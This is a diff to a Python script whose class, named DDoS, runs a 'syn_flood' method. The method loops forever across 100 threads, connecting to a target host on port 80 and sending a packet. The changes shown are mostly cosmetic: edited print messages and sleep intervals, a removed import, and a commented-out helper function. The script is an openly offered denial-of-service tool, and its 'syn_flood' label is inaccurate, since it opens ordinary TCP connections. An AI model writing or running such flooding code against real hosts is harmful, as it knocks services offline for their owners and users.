@@ -1,7 +1,16 @@
+
+'''
+def load():
+    c = []
+    for i in range(10000,20000):
+        
+        c.append(str(i)[1:5])
+
+    return c 
+'''
 import socket
 import threading
 import time
-import os
 ip=''
 port=80
 threads = 100
@@ -32,18 +41,23 @@ class DDoS:
     
     def syn_flood(self):
         while True:
-            print("Connecting")
+            print("Connecting...")
             
             try:
                 self.client.connect((self.host, self.port))
                 self.client.send(self.pack)
-                print("Connect-IP:{0}\n Port:{1}".format(self.host, self.port))
-                time.sleep(0.2)
+                print("\n")
+                
+                print("Connect-IP:{0} Port:{1}".format(self.host, self.port))
+                
+                print("\n")
+                time.sleep(0.5)
                 print("Successfully……")
             except Exception as error:
-                
-                print("Error:\n" + str(error))
-                time.sleep(0.2)
+                print("\n")
+                time.sleep(0.5)
+                print("Error:" + str(error))
+                time.sleep(0.5)
                 continue
 
 def input_settings():
